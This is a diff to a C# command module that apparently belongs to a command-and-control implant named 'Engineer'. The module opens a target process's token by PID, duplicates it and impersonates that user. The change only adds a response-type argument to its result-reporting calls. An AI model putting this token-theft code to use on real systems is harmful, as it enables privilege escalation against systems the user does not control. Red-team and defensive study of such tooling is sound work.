@@ -21,13 +21,13 @@ namespace Engineer.Commands
             {
 				if (!task.Arguments.TryGetValue("/pid", out string pidstring))
 				{
-					Tasking.FillTaskResults("error: " + "Missing pid", task, EngTaskStatus.FailedWithWarnings);
+					Tasking.FillTaskResults("error: " + "Missing pid", task, EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
                     return;
                 }
 				pidstring.TrimStart(' ');
 				if (!int.TryParse(pidstring, out int pid))
 				{
-					Tasking.FillTaskResults("error: " + "Failed to parse pid", task, EngTaskStatus.FailedWithWarnings);
+					Tasking.FillTaskResults("error: " + "Failed to parse pid", task, EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
                     return;
                 }
 
@@ -37,7 +37,7 @@ namespace Engineer.Commands
 				//open handle to token
 				if (!WinAPIs.Advapi.OpenProcessToken(hProcess.Handle, WinAPIs.Advapi.TOKEN_ALL_ACCESS, out var hToken))
 				{
-					Tasking.FillTaskResults("error: " + "Failed to open process token", task, EngTaskStatus.Failed);
+					Tasking.FillTaskResults("error: " + "Failed to open process token", task, EngTaskStatus.Failed,TaskResponseType.String);
                     return;
                 }
 				//duplicate token
@@ -46,7 +46,7 @@ namespace Engineer.Commands
 				{
 					WinAPIs.Kernel32.CloseHandle(hToken); // close the open handle we have since we failed duplication.
 					hProcess.Dispose();
-					Tasking.FillTaskResults("error: " + "failed to duplicate token", task, EngTaskStatus.Failed);
+					Tasking.FillTaskResults("error: " + "failed to duplicate token", task, EngTaskStatus.Failed,TaskResponseType.String);
                     return;
                 }
 
@@ -57,18 +57,18 @@ namespace Engineer.Commands
 					identity.Impersonate();
 					WinAPIs.Kernel32.CloseHandle(hToken); // can close now that we have successfully impersonated.
 					hProcess.Dispose();
-					Tasking.FillTaskResults($"Successfully impersonated {identity.Name}", task, EngTaskStatus.Complete);
+					Tasking.FillTaskResults($"Successfully impersonated {identity.Name}", task, EngTaskStatus.Complete,TaskResponseType.String);
                     return;
                 }
 
 				//close handle , should get here only if impersonate fails.
 				WinAPIs.Kernel32.CloseHandle(hToken);
 				hProcess.Dispose();
-				Tasking.FillTaskResults("error: " + "failed to impersonate token", task, EngTaskStatus.Failed);
+				Tasking.FillTaskResults("error: " + "failed to impersonate token", task, EngTaskStatus.Failed,TaskResponseType.String);
 			}
             catch (Exception ex)
             {
-				Tasking.FillTaskResults("error: " + ex.Message, task, EngTaskStatus.Failed);
+				Tasking.FillTaskResults("error: " + ex.Message, task, EngTaskStatus.Failed,TaskResponseType.String);
             }
 		}
     }
